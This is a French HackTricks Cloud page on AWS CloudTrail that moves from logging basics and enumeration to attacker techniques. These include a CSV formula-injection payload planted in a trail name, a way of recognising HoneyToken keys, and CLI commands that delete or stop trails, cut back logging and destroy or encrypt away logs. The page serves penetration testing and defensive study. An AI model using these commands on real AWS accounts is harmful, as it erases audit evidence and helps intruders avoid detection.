# AWS - Enum√©ration de CloudTrail

<details>

<summary><strong>Soutenez HackTricks et b√©n√©ficiez d'avantages !</strong></summary>

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou si vous souhaitez acc√©der √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## **CloudTrail**

Ce service **trace et surveille les appels d'API AWS effectu√©s dans l'environnement**. Chaque appel √† une API (√©v√©nement) est enregistr√©. Chaque √©v√©nement enregistr√© contient :

* Le nom de l'API appel√©e : `eventName`
* Le service appel√© : `eventSource`
* L'heure : `eventTime`
* L'adresse IP : `SourceIPAddress`
* La m√©thode de l'agent : `userAgent`. Exemples :
* Signing.amazonaws.com - Depuis la console de gestion AWS
* console.amazonaws.com - Utilisateur principal du compte
* lambda.amazonaws.com - AWS Lambda
* Les param√®tres de la requ√™te : `requestParameters`
* Les √©l√©ments de r√©ponse : `responseElements`

Les √©v√©nements sont √©crits dans un nouveau fichier journal **environ toutes les 5 minutes dans un fichier JSON**, ils sont conserv√©s par CloudTrail et enfin, les fichiers journaux sont **livr√©s √† S3 environ 15 minutes apr√®s**.\
Les journaux de CloudTrail peuvent √™tre **agr√©g√©s entre les comptes et entre les r√©gions**.\
CloudTrail permet d'utiliser **l'int√©grit√© des fichiers journaux afin de pouvoir v√©rifier que vos fichiers journaux n'ont pas √©t√© modifi√©s** depuis que CloudTrail vous les a livr√©s. Il cr√©e un hachage SHA-256 des journaux dans un fichier de synth√®se. Un hachage sha-256 des nouveaux journaux est cr√©√© toutes les heures.\
Lors de la cr√©ation d'une piste, les s√©lecteurs d'√©v√©nements vous permettent d'indiquer la piste √† enregistrer : √©v√©nements de gestion, de donn√©es ou d'informations.

Les journaux sont enregistr√©s dans un compartiment S3. Par d√©faut, le chiffrement c√¥t√© serveur est utilis√© (SSE-S3) afin qu'AWS d√©chiffre le contenu pour les personnes qui y ont acc√®s, mais pour une s√©curit√© suppl√©mentaire, vous pouvez utiliser SSE avec KMS et vos propres cl√©s.

### Convention de nommage des fichiers journaux

![](<../../../../.gitbook/assets/image (29).png>)

### Structure des dossiers S3

![](<../../../../.gitbook/assets/image (47).png>)

Notez que les dossiers "_AWSLogs_" et "_CloudTrail_" sont des noms de dossiers fixes,

Les fichiers **Digest** ont un chemin de dossiers similaire :

![](<../../../../.gitbook/assets/image (22).png>)

### Agr√©ger les journaux de plusieurs comptes

* Cr√©ez une piste dans le compte AWS o√π vous souhaitez que les fichiers journaux soient livr√©s
* Appliquez des autorisations au compartiment S3 de destination permettant l'acc√®s inter-comptes pour CloudTrail et autorisez chaque compte AWS qui a besoin d'acc√®s
* Cr√©ez une nouvelle piste dans les autres comptes AWS et s√©lectionnez l'utilisation du compartiment cr√©√© √† l'√©tape 1

Cependant, m√™me si vous pouvez enregistrer tous les journaux dans le m√™me compartiment S3, vous ne pouvez pas agr√©ger les journaux CloudTrail de plusieurs comptes dans un journal CloudWatch appartenant √† un seul compte AWS.

### Cloudtrail de tous les comptes d'une organisation en un seul

Lors de la cr√©ation d'un CloudTrail, il est possible d'indiquer d'activer CloudTrail pour tous les comptes de l'organisation et d'obtenir les journaux dans un seul compartiment :

<figure><img src="../../../../.gitbook/assets/image (1) (1) (5).png" alt=""><figcaption></figcaption></figure>

De cette fa√ßon, vous pouvez facilement configurer CloudTrail dans toutes les r√©gions de tous les comptes et centraliser les journaux dans 1 compte (que vous devriez prot√©ger).

### V√©rification des fichiers journaux

Vous pouvez v√©rifier que les journaux n'ont pas √©t√© modifi√©s en ex√©cutant
```javascript
aws cloudtrail validate-logs --trail-arn <trailARN> --start-time <start-time> [--end-time <end-time>] [--s3-bucket <bucket-name>] [--s3-prefix <prefix>] [--verbose]
```
### Journaux vers CloudWatch

**CloudTrail peut automatiquement envoyer des journaux vers CloudWatch afin que vous puissiez configurer des alertes qui vous avertissent lorsque des activit√©s suspectes sont effectu√©es.**\
Notez que pour permettre √† CloudTrail d'envoyer les journaux vers CloudWatch, un **r√¥le** doit √™tre cr√©√© pour autoriser cette action. Si possible, il est recommand√© d'utiliser le r√¥le par d√©faut d'AWS pour effectuer ces actions. Ce r√¥le permettra √† CloudTrail de :

* CreateLogStream : Cela permet de cr√©er un flux de journaux CloudWatch Logs
* PutLogEvents : Livrer les journaux CloudTrail au flux de journaux CloudWatch Logs

### Historique des √©v√©nements

L'historique des √©v√©nements CloudTrail vous permet d'inspecter dans un tableau les journaux qui ont √©t√© enregistr√©s :

![](<../../../../.gitbook/assets/image (24).png>)

### Insights

**CloudTrail Insights** analyse automatiquement les √©v√©nements de gestion d'√©criture des pistes CloudTrail et vous alerte en cas d'activit√© inhabituelle. Par exemple, si vous constatez une augmentation des √©v√©nements `TerminateInstance` qui diff√®re des r√©f√©rences √©tablies, vous le verrez comme un √©v√©nement Insight. Ces √©v√©nements facilitent plus que jamais la **recherche et la r√©ponse √† une activit√© API inhabituelle**.

### S√©curit√©

| Int√©grit√© des fichiers journaux CloudTrail | <ul><li>V√©rifie si les journaux ont √©t√© alt√©r√©s (modifi√©s ou supprim√©s)</li><li><p>Utilise des fichiers de hachage (cr√©e un hachage pour chaque fichier)</p><ul><li>Hachage SHA-256</li><li>Hachage SHA-256 avec RSA pour la signature num√©rique</li><li>Cl√© priv√©e d√©tenue par Amazon</li></ul></li><li>Prend 1 heure pour cr√©er un fichier de hachage (effectu√© √† chaque heure)</li></ul> |
| ----------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Emp√™cher l'acc√®s non autoris√©             | <ul><li><p>Utilisez des strat√©gies IAM et des strat√©gies de compartiment S3</p><ul><li>√©quipe de s√©curit√© -> acc√®s administrateur</li><li>v√©rificateurs -> acc√®s en lecture seule</li></ul></li><li>Utilisez SSE-S3/SSE-KMS pour chiffrer les journaux</li></ul>                                                                                                                               |
| Emp√™cher la suppression des fichiers journaux | <ul><li>Restreindre l'acc√®s √† la suppression avec IAM et les strat√©gies de compartiment</li><li>Configurer la suppression S3 MFA</li><li>Valider avec la validation des fichiers journaux</li></ul>                                                                                                                                                                                     |

## Actions

### √ânum√©ration
```bash
# Get trails info
aws cloudtrail list-trails
aws cloudtrail describe-trails
aws cloudtrail list-public-keys
aws cloudtrail get-event-selectors --trail-name <trail_name>
aws [--region us-east-1] cloudtrail get-trail-status --name [default]

# Get insights
aws cloudtrail get-insight-selectors --trail-name <trail_name>

# Get data store info
aws cloudtrail list-event-data-stores
aws cloudtrail list-queries --event-data-store <data-source>
aws cloudtrail get-query-results --event-data-store <data-source> --query-id <id>
```
### **Injection de CSV**

Il est possible d'effectuer une injection de CSV dans CloudTrail qui ex√©cutera du code arbitraire si les journaux sont export√©s en CSV et ouverts avec Excel.\
Le code suivant g√©n√©rera une entr√©e de journal avec un nom de Trail incorrect contenant la charge utile :
```python
import boto3
payload = "=cmd|'/C calc'|''"
client = boto3.client('cloudtrail')
response = client.create_trail(
Name=payload,
S3BucketName="random"
)
print(response)
```
Pour plus d'informations sur les injections CSV, consultez la page:

{% embed url="https://book.hacktricks.xyz/pentesting-web/formula-injection" %}

Pour plus d'informations sur cette technique sp√©cifique, consultez [https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/](https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/)

## **√âviter la d√©tection**

### Contourner les **HoneyTokens**

Les HoneyTokens sont cr√©√©s pour **d√©tecter l'exfiltration d'informations sensibles**. Dans le cas d'AWS, ce sont des **cl√©s AWS dont l'utilisation est surveill√©e**, si quelque chose d√©clenche une action avec cette cl√©, alors quelqu'un doit avoir vol√© cette cl√©.

Cependant, cette surveillance est effectu√©e via **CloudTrail**, et il y a certains **services AWS qui n'envoient pas de journaux √† CloudTrail** (trouvez la [liste ici](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-unsupported-aws-services.html)). Certains de ces services **r√©pondront** avec une **erreur** contenant le **ARN du r√¥le de la cl√©** si quelqu'un non autoris√© (la cl√© HoneyToken) essaie d'y acc√©der.

De cette mani√®re, un **attaquant peut obtenir l'ARN de la cl√© sans d√©clencher de journal**. Dans l'ARN, l'attaquant peut voir l'**ID du compte AWS et le nom**, il est facile de conna√Ætre les ID et noms des comptes des entreprises utilisant HoneyToken, de cette mani√®re un attaquant peut identifier si le jeton est un HoneyToken.

![](<../../../../.gitbook/assets/image (65).png>)

[**Ce script**](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-unsupported-aws-services.html) ou [**Pacu**](https://github.com/RhinoSecurityLabs/pacu) d√©tecte si une cl√© appartient √† **Canarytokens** ou **SpaceCrab**.

{% hint style="danger" %}
L'API utilis√©e dans Pacu et le script **est maintenant bloqu√©e**, vous devez donc **en trouver une nouvelle**.\
Pour en trouver une nouvelle, vous pouvez g√©n√©rer un jeton canary sur [https://canarytokens.org/generate](https://canarytokens.org/generate)
{% endhint %}

Pour plus d'informations, consultez la [**recherche originale**](https://rhinosecuritylabs.com/aws/aws-iam-enumeration-2-0-bypassing-cloudtrail-logging/).

### Supprimer les trails
```bash
aws cloudtrail delete-trail --name [trail-name]
```
### Arr√™ter les trails

Pour arr√™ter un trail dans AWS CloudTrail, vous pouvez utiliser l'interface en ligne de commande AWS (AWS CLI) ou la console de gestion AWS.

#### Utilisation de l'AWS CLI

Pour arr√™ter un trail √† l'aide de l'AWS CLI, utilisez la commande suivante :

```bash
aws cloudtrail stop-logging --name <nom-du-trail>
```

Remplacez `<nom-du-trail>` par le nom du trail que vous souhaitez arr√™ter.

#### Utilisation de la console de gestion AWS

Pour arr√™ter un trail √† l'aide de la console de gestion AWS, suivez les √©tapes suivantes :

1. Connectez-vous √† la console de gestion AWS.
2. Acc√©dez au service CloudTrail.
3. Dans le volet de navigation, cliquez sur "Trails".
4. S√©lectionnez le trail que vous souhaitez arr√™ter.
5. Cliquez sur le bouton "Stop logging" pour arr√™ter le trail.

Une fois que vous avez arr√™t√© un trail, il ne collectera plus de donn√©es de journalisation.
```bash
aws cloudtrail stop-logging --name [trail-name]
```
### D√©sactiver l'enregistrement multi-r√©gion

By default, AWS CloudTrail logs events from all regions in your AWS account. This can be useful for monitoring and auditing purposes, but it can also increase costs and create unnecessary logs.

To disable multi-region logging in AWS CloudTrail, follow these steps:

1. Open the AWS Management Console and navigate to the CloudTrail service.
2. Select the trail for which you want to disable multi-region logging.
3. Click on the "Edit" button.
4. In the "Trail settings" section, locate the "Multi-Region" option.
5. Toggle the switch to the "Off" position.
6. Click on the "Save" button to apply the changes.

Once multi-region logging is disabled, CloudTrail will only log events from the region where the trail is created. This can help reduce costs and simplify log management.

Note: Disabling multi-region logging may limit your visibility into events occurring in other regions. Make sure to consider the implications before making this change.
```bash
aws cloudtrail update-trail --name [trail-name] --no-is-multi-region --no-include-global-services
```
### D√©sactiver l'enregistrement par les s√©lecteurs d'√©v√©nements

{% code overflow="wrap" %}
```bash
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[{"ReadWriteType": "ReadOnly"}]' --region <region>
```
{% endcode %}

Dans cet exemple, un seul s√©lecteur d'√©v√©nements est fourni sous la forme d'un tableau JSON avec un seul objet. Le `"ReadWriteType": "ReadOnly"` indique que le s√©lecteur d'√©v√©nements ne doit capturer que les √©v√©nements en lecture seule. Vous pouvez personnaliser le s√©lecteur d'√©v√©nements en fonction de vos besoins sp√©cifiques.

### Suppression des journaux via la politique de cycle de vie S3

{% code overflow="wrap" %}
```bash
aws s3api put-bucket-lifecycle --bucket <bucket_name> --lifecycle-configuration '{"Rules": [{"Status": "Enabled", "Prefix": "", "Expiration": {"Days": 7}}]}' --region <region>
```
{% endcode %}

### Modification du bucket

* Supprimer le bucket S3
* Modifier la strat√©gie du bucket pour refuser toute √©criture depuis le service CloudTrail
* Ajouter une strat√©gie de cycle de vie au bucket S3 pour supprimer les objets
* D√©sactiver la cl√© KMS utilis√©e pour chiffrer les journaux CloudTrail

### "Ransomware" CloudTrail

Vous pouvez **g√©n√©rer une cl√© asym√©trique** et faire en sorte que **CloudTrail chiffre les donn√©es** avec cette cl√© et **supprimer la cl√© priv√©e** afin que le contenu de CloudTrail ne puisse pas √™tre r√©cup√©r√©.

![](https://lh6.googleusercontent.com/DRckYJKCAVyDeUY6cganqHTcfvlRMrOcnInUx25f9s9rstNvvkXbu-OS2ZozMvh0Oqxdc9Ehrsc8QJTVGZkbDih\_zsjU2KRvHVGahLqbfAhnD0VLdk096xPNJuAebOJYtDZ71SlnJt6rQj0\_3Q)

![](https://lh3.googleusercontent.com/GfGI0jCdTe2S2HNVMKdNaltBfv9ls6lZqSQt1FkR8mgcxKNdvVmAE2vl77Sr23KWJ6X7-X4UJVgkN5KsQxYEdqOTIWwjr6DHCK9s\_iw5whQkN\_TVPOycc2qHZUSU9NED\_k2lEYK4SpavbTxZ6w)

![](https://lh5.googleusercontent.com/Y9iLLB5RtmBoBVrLE9GKkGK6mxGWtAL6oSwVxgwqYxYHkXpimUZJmAT\_AkxQW-hpdz2kaHpaqXXHwvzz3osg-JA5i1c8\_bWoz5HlTj0mup0MAvG6B5IAnnsnvIDtpqflW4UzIOKZYDxxdxUSDQ)

## **R√©f√©rences**

* [https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory](https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory)

<details>

<summary><strong>Soutenez HackTricks et b√©n√©ficiez d'avantages !</strong></summary>

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou si vous souhaitez acc√©der √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
